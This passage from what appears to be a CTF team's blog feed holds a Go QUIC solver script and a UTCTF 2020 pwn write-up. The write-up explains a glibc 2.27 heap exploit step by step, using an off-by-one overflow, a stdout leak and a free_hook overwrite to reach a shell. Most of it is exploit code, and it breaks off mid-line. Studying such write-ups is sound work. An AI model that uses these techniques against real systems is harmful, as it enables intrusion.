class="string">"0.0.0.0:6969"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> message = <span class="string">"Hello"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// We start a server echoing data on the first stream the client opens,</span></span><br><span class="line"><span class="comment">// then connect with a client, send the message, and wait for its receipt.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    wg.Add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; log.Fatal(echoServer()) &#125;()</span><br><span class="line">    err := clientMain()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calculateExp</span><span class="params">(num1 <span class="keyword">int</span>,num2 <span class="keyword">int</span>,exp <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> exp &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"+"</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 + num2</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"-"</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 - num2</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"/"</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 / num2</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"*"</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 * num2</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"^"</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 ^ num2</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"&amp;"</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 &amp; num2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start a server that echos all data on the first stream opened by the client</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echoServer</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    listener, err := quic.ListenAddr(addrClientS, generateTLSConfig(), <span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    sess, err := listener.Accept(context.Background())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    stream, err := sess.AcceptStream(context.Background())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = readBytes(stream, <span class="number">26</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">        num := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">0x30</span>)</span><br><span class="line">        _, err = stream.Read(num);</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        re := regexp.MustCompile(<span class="string">"[0-9]+"</span>)</span><br><span class="line">        re2 := regexp.MustCompile(<span class="string">"[-+*/^&amp;]"</span>)</span><br><span class="line">        num1,_ := strconv.Atoi(re.FindAllString(<span class="keyword">string</span>(num),<span class="number">-1</span>)[<span class="number">0</span>])</span><br><span class="line">        num2,_ := strconv.Atoi(re.FindAllString(<span class="keyword">string</span>(num),<span class="number">-1</span>)[<span class="number">1</span>])</span><br><span class="line">        exp := re2.FindString(<span class="keyword">string</span>(num))</span><br><span class="line">        <span class="comment">//fmt.Printf("%s\n", num)</span></span><br><span class="line">        <span class="comment">//fmt.Printf("%d\n", num1)</span></span><br><span class="line">        <span class="comment">//fmt.Printf("%s\n", exp)</span></span><br><span class="line">        <span class="comment">//fmt.Printf("%d\n", num2)</span></span><br><span class="line">        res := calculateExp(num1, num2, exp)</span><br><span class="line">        <span class="comment">//fmt.Printf("%d\n", res)</span></span><br><span class="line">        _,err = io.WriteString(stream,strconv.Itoa(res))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    b, err := ioutil.ReadAll(stream)</span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, b)</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readBytes</span><span class="params">(stream io.Reader, n <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt; n; i++ &#123;</span><br><span class="line">        buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">1</span>)</span><br><span class="line">        _, err := io.ReadFull(stream, buf);</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Printf(<span class="string">"%s"</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">toHex</span><span class="params">(x []<span class="keyword">byte</span>, n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    re := regexp.MustCompile(<span class="string">"[0-9]+"</span>)</span><br><span class="line">    h,err := strconv.Atoi(re.FindString(<span class="keyword">string</span>(x)))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">"%x"</span>, h)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">clientMain</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    tlsConf := &amp;tls.Config&#123;</span><br><span class="line">        InsecureSkipVerify: <span class="literal">true</span>,</span><br><span class="line">        NextProtos:         []<span class="keyword">string</span>&#123;<span class="string">"quic-echo-example"</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    session, err := quic.DialAddr(addr, tlsConf, <span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stream, err := session.OpenStreamSync(context.Background())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"Client: Sending '%s'\n"</span>, message)</span><br><span class="line">    _, err = io.WriteString(stream,message)<span class="comment">//stream.Write([]byte(message))</span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = readBytes(stream, <span class="number">248</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//fmt.Printf("Now number:\n")</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">        num := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">7</span>)</span><br><span class="line">        n, err := stream.Read(num);</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        s := <span class="string">"0x"</span>+toHex(num,n)</span><br><span class="line">        <span class="comment">//fmt.Printf("%d\n", i)</span></span><br><span class="line">        <span class="comment">//fmt.Printf("Received %s", num);</span></span><br><span class="line">        <span class="comment">//fmt.Printf("Sending %s\n",s)</span></span><br><span class="line">        <span class="comment">//_,err = io.WriteString(stream,s)</span></span><br><span class="line">        _, err = stream.Write([]<span class="keyword">byte</span>(s))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    b, err := ioutil.ReadAll(stream)</span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, b)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A wrapper for io.Writer that also logs the message.</span></span><br><span class="line"><span class="keyword">type</span> loggingWriter <span class="keyword">struct</span>&#123; io.Writer &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w loggingWriter)</span> <span class="title">Write</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Server: Got '%s'\n"</span>, <span class="keyword">string</span>(b))</span><br><span class="line">    <span class="keyword">return</span> w.Writer.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup a bare-bones TLS config for the server</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateTLSConfig</span><span class="params">()</span> *<span class="title">tls</span>.<span class="title">Config</span></span> &#123;</span><br><span class="line">    key, err := rsa.GenerateKey(rand.Reader, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    template := x509.Certificate&#123;SerialNumber: big.NewInt(<span class="number">1</span>)&#125;</span><br><span class="line">    certDER, err := x509.CreateCertificate(rand.Reader, &amp;template, &amp;template, &amp;key.PublicKey, key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    keyPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: <span class="string">"RSA PRIVATE KEY"</span>, Bytes: x509.MarshalPKCS1PrivateKey(key)&#125;)</span><br><span class="line">    certPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: <span class="string">"CERTIFICATE"</span>, Bytes: certDER&#125;)</span><br><span class="line"></span><br><span class="line">    tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;tls.Config&#123;</span><br><span class="line">        Certificates: []tls.Certificate&#123;tlsCert&#125;,</span><br><span class="line">        NextProtos:   []<span class="keyword">string</span>&#123;<span class="string">"quic-echo-example"</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;QUICk Servers&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Solves&lt;/strong&gt;: 17&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 1988   &lt;/p&gt;
&lt;p&gt;&lt;
      
    
    </summary>
    
      <category term="Network" scheme="https://teamrocketist.github.io/categories/Network/"/>
    
    
      <category term="network" scheme="https://teamrocketist.github.io/tags/network/"/>
    
      <category term="utctf2020" scheme="https://teamrocketist.github.io/tags/utctf2020/"/>
    
      <category term="quic" scheme="https://teamrocketist.github.io/tags/quic/"/>
    
      <category term="golang" scheme="https://teamrocketist.github.io/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] UTCTF 2020 - Cancelled</title>
    <link href="https://teamrocketist.github.io/2020/03/10/Pwn-UTCTF-2020-Cancelled/"/>
    <id>https://teamrocketist.github.io/2020/03/10/Pwn-UTCTF-2020-Cancelled/</id>
    <published>2020-03-10T04:22:27.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Cancelled</p></blockquote><blockquote><p><strong>Description</strong>:<br>1879pts</p><p>Solvers 26</p><p>We should cancel all pwners. by jitterbug</p><p><a href="https://mega.nz/#!Hzo1HCiD!yOfFh6Tjps4ztr-07QFVHee76DfsldXMPpKqOrH2ykA" target="_blank" rel="noopener">pwnable</a><br>2377bb9cec90614f4ba5c4c213a48709<br><a href="https://mega.nz/#!GywxiKiQ!AY5cyOEkeFq4UCGlk9wj3bEMQNQu8ls322qL6eKtSAI" target="_blank" rel="noopener">libc-2.27.so</a><br>50390b2ae8aaa73c47745040f54e602f   </p><p>nc binary.utctf.live 9050</p></blockquote><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ul><li>Allocate 4 chunks <strong>A[0x18]</strong>, <strong>B[0x18]</strong>, <strong>C[0x70]</strong>, <strong>D[0x21]</strong>.</li><li>Free chunk <strong>A[0x18]</strong>.</li><li>Allocate a new chunk <strong>A[0x18]</strong> and use <strong>off by one</strong> overflow to <strong>change</strong> size of B to 0x91.</li><li>Free chunk <strong>B</strong>, this <strong>won’t</strong> return any errors because we created some <strong>fake</strong> chunks in <strong>C</strong> and <strong>D</strong>.</li><li><strong>B[0x90]</strong> is on <strong>unsortedbin</strong> now.</li><li>Free chunk <strong>C</strong>.</li><li>Next allocations will <strong>reuse</strong> space from <strong>chunk B</strong> if they fit.</li><li>Allocate a new chunk of size 0x10 to put a <strong>libc address</strong> at the <strong>FD</strong> of chunk C.</li><li>Malloc(0x20) and do a <strong>4 bit</strong> brute force at the <strong>libc address</strong> present in <strong>FD</strong> to get <strong>stdout</strong>.</li><li>Stdout is now present in the <strong>tcache[0x80]</strong> linked list.</li><li>Second <strong>malloc</strong> of that size will write into the stdout struct.</li><li>Modify <strong>_IO_2_1_stdout</strong> to make <strong>puts</strong> leak a libc address (<strong>Angelboy</strong> leak).</li><li>Reuse the <strong>same</strong> technique to modify some tcache linked list <strong>pointer</strong> into <strong>free_hook</strong>.</li><li>Write <strong>system</strong> into <strong>free_hook</strong>.</li><li>Free a chunk that has <strong>/bin/sh\x00</strong> as content to get a <strong>shell</strong>.</li></ul><h3 id="Architecture-and-protections"><a href="#Architecture-and-protections" class="headerlink" title="Architecture and protections"></a>Architecture and protections</h3><p>The binary is <strong>64-bit</strong> and libc is <strong>dynamically</strong> linked.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file pwnable</span><br><span class="line">pwnable: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=4185d6d607a16d28f64337f42a47822bed521751, not stripped</span><br></pre></td></tr></table></figure><p>Besides fortify everything is enabled:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwnable</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/cancelled/pwnable'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p>The binary has two options, in the “add person” option we can specify the <strong>index</strong> to store the persons name and a description, for the description we can also control its size.<br>The cancel person option we can remove it from the list by <strong>specifying</strong> the respective <strong>index</strong>.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>We have a controllable off by one at the add option:<br><a data-fancybox="gallery" href="https://i.imgur.com/JnSdlwR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/JnSdlwR.png" alt><br></a></p><h3 id="Angelboy-leak"><a href="#Angelboy-leak" class="headerlink" title="Angelboy leak"></a>Angelboy leak</h3><p>Not sure if this technique was first used by <a href="https://twitter.com/scwuaptx" target="_blank" rel="noopener">angelboy</a> but the first time I saw it being used was at Hitcon 2018, in a challenge created by himself which he later published his solution at <a href="https://github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py" target="_blank" rel="noopener">github</a>.</p><p>This technique resolves on corrupting the <strong>stdout</strong> <code>IO_FILE</code> struct to make puts leak a libc address, I’m not explaining in detail the internals of <strong>printf</strong> you can find some explanations in my older write up <a href="https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/">plane market</a> or at <a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">babytcache</a> writeup.</p><p>To write into the <strong>stdout</strong> IO_FILE struct we kinda need to do a 4 bit brute-force  in an unsorted bin libc address, but to achieve this we need to first use the off by one overflow vulnerability.</p><p>The main idea here is to use <strong>off by one</strong> to increase the size of a chunk in the unsorted bin to get some chunk overlaps via shrinking of the freed chunk and also overlapping new allocated chunks.</p><p>We can start by creating 4 chunks (A,B,C,D).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x0</span>, <span class="string">'A'</span>*<span class="number">8</span>, <span class="number">0x18</span>, <span class="string">'A'</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0x1</span>, <span class="string">'B'</span>*<span class="number">8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x8</span>) <span class="comment"># Overwrite this chunk size is the objective</span></span><br><span class="line">add(<span class="number">0x2</span>, <span class="string">'C'</span>*<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b'C'</span>*<span class="number">96</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># Prevent Double-free or corruption</span></span><br><span class="line">add(<span class="number">0x3</span>, <span class="string">'D'</span>*<span class="number">8</span>, <span class="number">0x21</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x1</span>)) <span class="comment"># corrupted vs. prev_size</span></span><br></pre></td></tr></table></figure><p>The next thing to do is to change <strong>chunk B</strong> size into 0x91, but the libc version is <strong>2.27</strong> which uses <strong>tcache</strong>, so any chunk bellow <strong>0x410</strong> will go into their respective tcache bin. To prevent this we can fill tcache[0x90] with 7 frees which is the limit of a tcache bin:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">  add(<span class="number">0x4</span>+x, <span class="string">'E'</span>*<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">'E'</span>*<span class="number">8</span>) <span class="comment"># Create 0x90 chunks to later fill tcache[0x90]</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">  free(<span class="number">0x4</span>+x) <span class="comment"># Fill tcache[0x90]</span></span><br></pre></td></tr></table></figure><p>Now that <strong>tcache[0x90]</strong> is full we have to overflow <strong>chunks B</strong> size, there isn’t an edit function so we need to free <strong>chunk A</strong> first and allocate a new one there. The chunk A is now placed at <strong>tcache[0x20]</strong> if the new allocation is in same range that memory space is reused, and the <strong>new</strong> chunk will be placed at the <strong>same</strong> place as the <strong>old A</strong>. Now that we can control <strong>chunks A</strong> description we can finally modify <strong>chunks B</strong> size to <strong>0x91</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># Insert chunk A into tcache[0x20]</span></span><br><span class="line">add(<span class="number">0x0</span>, <span class="string">'A'</span>*<span class="number">8</span>, <span class="number">0x18</span>, <span class="string">'A'</span>*<span class="number">0x18</span>+<span class="string">'\x91'</span>) <span class="comment"># Overflow B size to 0x91</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># Goes to the unsorted bin because tcache[0x20] is full</span></span><br></pre></td></tr></table></figure><p>The chunks created inside C and D are to prevent two security checks <strong>“prevent double-free or corruption”</strong> and <strong>“corrupted vs. prev_size”</strong> when freeing <strong>chunk B</strong>, you can check my write up  <a href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/">penpal_world</a> to understand more about this security checks.</p><p>Now we want to use <strong>tcache[0x90]</strong> again, we filled it before by freeing 7 times , to use it again we need to malloc the same numbers:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">  add(<span class="number">0xa</span>+x, <span class="string">'A'</span>*<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># clean tcache[0x90]</span></span><br></pre></td></tr></table></figure><p><strong>tcache[0x90]</strong> is now reusable again, we can now send chunk C into tcache[0x90] , <strong>chunk C</strong> is located right after <strong>chunk B</strong> which size just got increased, because of this it can be used to overlap the fd pointer of <strong>chunk C</strong> by shrinking <strong>chunk B</strong> using malloc:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x11, <span class="string">'A'</span>*8, 0x10, <span class="string">'A'</span>*0x2) <span class="comment"># put a libc address at next pointer from tcache[0x80]</span></span><br></pre></td></tr></table></figure><p>The view of the chunks before the shrink:<br><a data-fancybox="gallery" href="https://i.imgur.com/xwBEfSG.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xwBEfSG.png" alt><br></a><br>The view after the shrink:<br><a data-fancybox="gallery" href="https://i.imgur.com/sfKZgBY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/sfKZgBY.png" alt><br></a><br>It’s time to update the FD of C into <strong>stdout</strong>, we can do this by allocating a 0x20 chunk to shrink B again and overlap C:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x12</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x20</span>, <span class="string">'\x60\xa7'</span>) <span class="comment"># STDOUT, trying a 4bit bruteforce</span></span><br></pre></td></tr></table></figure><p>Failed attempt to get stdout:<br><a data-fancybox="gallery" href="https://i.imgur.com/HT8rm3W.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/HT8rm3W.png" alt><br></a><br>To check if we succeeded to get it we can preform this checks:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x13</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x70</span>, <span class="string">'A'</span>) <span class="comment"># head of tcache[0x80]</span></span><br><span class="line">free(<span class="number">0x13</span>) <span class="comment"># to make tcache[0x80] counter positive</span></span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x70</span>, p64(<span class="number">0x0fbad1800</span>)+ <span class="number">3</span>*p64(<span class="number">0</span>) + <span class="string">b'\x00'</span>) <span class="comment"># overwrite stdout to get a leak</span></span><br><span class="line"><span class="keyword">if</span> r.recv(<span class="number">4</span>) == <span class="string">b'Menu'</span>: <span class="comment"># first check to see if the leak happened</span></span><br><span class="line">    log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">LEAK = u64(r.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">LIBC = LEAK<span class="number">-0x3ed8b0</span></span><br><span class="line"><span class="keyword">if</span> LIBC &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span> <span class="keyword">or</span> LIBC &amp; <span class="number">0xFFF</span> != <span class="number">0</span>: <span class="comment"># 2nd check to make sure</span></span><br><span class="line">    log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="Update-free-hook-to-system"><a href="#Update-free-hook-to-system" class="headerlink" title="Update free_hook to system"></a>Update free_hook to system</h3><p>To update free_hook we can do a similar strategy we used before to edit stdout, we can start by freeing a chunk after the old chunk B located in the unsorted bin and then allocate it again to create a fake chunk inside of it(to prevent a security check error):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0xa</span>+<span class="number">6</span>, <span class="keyword">True</span>) <span class="comment"># free chunk after old chunk B</span></span><br><span class="line">add(<span class="number">0xa</span>+<span class="number">6</span>, <span class="string">'K'</span>*<span class="number">8</span>, <span class="number">0x80</span>, p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x70</span>), <span class="keyword">True</span>) <span class="comment"># create a fake chunk inside so we can increase the size of chunk B</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/hHI3Fn5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/hHI3Fn5.png" alt><br></a><br>Next we allocate the chunk before chunk B and tamper the size to 0xa1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x0</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x28</span>, <span class="string">'A'</span>*<span class="number">0x28</span>+<span class="string">'\xa1'</span>, <span class="keyword">True</span>) <span class="comment"># change size of chunk B to 0xa1</span></span><br><span class="line">free(<span class="number">0xa</span>+<span class="number">6</span>,<span class="keyword">True</span>) <span class="comment"># free chunk after chunk B again</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/o7BkEGv.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/o7BkEGv.png" alt><br></a><br>Now that chunk B overlaps the next, we can allocate a chunk that covers the entire freed chunk and edit the FD of the next chunk to free_hook:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x0</span>, <span class="string">'L'</span>*<span class="number">8</span>, <span class="number">0x90</span>, <span class="string">b'L'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(FREE_HOOK), <span class="keyword">True</span>) <span class="comment"># Overlapping chunk</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/HJuzU7c.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/HJuzU7c.png" alt><br></a><br>Now is a matter of doing two mallocs and change the hook to system and freeing a chunk with “/bin/sh\x00” in its data:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x7</span>, <span class="string">b'/bin/sh\x00'</span>, <span class="number">0x80</span>, <span class="string">b'/bin/sh\x00'</span>, <span class="keyword">True</span>) <span class="comment"># prepare the first argument of system</span></span><br><span class="line">add(<span class="number">0x13</span>, <span class="string">b'/bin/sh\x00'</span>, <span class="number">0x80</span>, p64(SYSTEM), <span class="keyword">True</span>) <span class="comment"># update free_hook contents to system</span></span><br><span class="line">free(<span 